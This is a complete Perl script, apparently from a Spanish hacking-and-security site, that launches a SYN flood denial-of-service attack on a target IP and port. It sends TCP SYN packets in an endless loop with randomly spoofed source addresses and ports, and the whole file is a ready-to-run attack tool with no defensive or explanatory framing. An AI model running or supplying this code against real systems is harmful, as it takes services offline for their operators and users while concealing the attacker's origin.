#!/usr/bin/perl
# spoofdos.pl
# Author: Antonio Taboada
# Derechos: (c) hackingyseguridad.com 2017
# Uso: spoofdos IP Puerto; Hace SYN Flood con IP origen spoofeada aleatoria
 
use Net::RawIP;
 
sub geraIP(){
    $range = 255;
    $iA = int(rand($range));
    $iB = int(rand($range));
    $iC = int(rand($range));
    $iD = int(rand($range));
 
    return $iA . "." . $iB . "." . $iC . "." . $iD;
}
 
sub attack(){
   ($dst,$port) = @ARGV;
   $a = new Net::RawIP;
   while(1) {
      $src_port = rand(65534)+1;
      $src = geraIP();
      $a->set({ip => {saddr => $src,daddr => $dst},tcp => {source => $src_port,dest => $port, syn => 1}});
      $a->send;
   }
}
if($#ARGV == 1) {
    attack();
 
} else {
   print "Target Port\n";
}
